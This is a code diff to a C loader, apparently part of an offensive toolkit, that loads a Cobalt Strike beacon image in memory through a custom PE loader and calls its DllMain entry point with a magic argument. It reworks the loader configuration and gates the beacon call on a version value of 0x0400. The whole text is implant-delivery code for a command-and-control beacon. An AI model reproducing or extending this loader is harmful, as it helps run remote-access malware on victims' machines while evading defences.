@@ -29,7 +29,7 @@ errno Boot(void* ctx)
     (void)ctx;
 
     // initialize PE Loader and load image
-    uint32 version;
+    uint16 version;
     PELoader_M* loader = NULL;
     errno err = NO_ERROR;
     for (;;)
@@ -52,21 +52,13 @@ errno Boot(void* ctx)
             err = GetLastErrno();
             break;
         }
-        PELoader_Cfg config = {
-            .FindAPI = runtime->HashAPI.FindAPI_MA,
-
-            .Image          = image,
-            .CommandLineA   = NULL,
-            .CommandLineW   = NULL,
-            .StdInput       = NULL,
-            .StdOutput      = NULL,
-            .StdError       = NULL,
-            .WaitMain       = false,
-            .AllowSkipDLL   = false,
-            .IgnoreStdIO    = true,
-            .NotAutoRun     = false,
-            .NotStopRuntime = false,
-        };
+        // prevent incorrect optimization about init struct
+        PELoader_Cfg config;
+        mem_init(&config, sizeof(config));
+        config.FindAPI     = runtime->HashAPI.FindAPI_MA;
+        config.Image       = image;
+        config.IgnoreStdIO = true;
+        // load beacon image
         loader = InitPELoader(runtime, &config);
         if (loader == NULL)
         {
@@ -76,21 +68,28 @@ errno Boot(void* ctx)
         runtime->Memory.Free(image);
         // initialize dll before start beacon
         err = loader->Execute();
+        runtime->Argument.EraseAll();
         break;
     }
-    runtime->Argument.EraseAll();
     if (err != NO_ERROR || loader == NULL)
     {
         runtime->Core.Exit();
         return err;
     }
 
-    // call cs beacon entry point
-    DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
-    HMODULE   hModule = (HMODULE)(loader->ImageBase);
-    if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
+    // call cs beacon entry point and it will be blocked
+    switch (version)
     {
-        err = ERR_CALL_BEACON_ENTRY_POINT;
+    case 0x0400:
+        DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
+        HMODULE   hModule = (HMODULE)(loader->ImageBase);
+        if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
+        {
+            err = ERR_CALL_BEACON_ENTRY_POINT;
+        }
+        break;
+    default:
+        panic(PANIC_UNREACHABLE_CODE);
     }
 
     // destroy pe loader and exit runtime
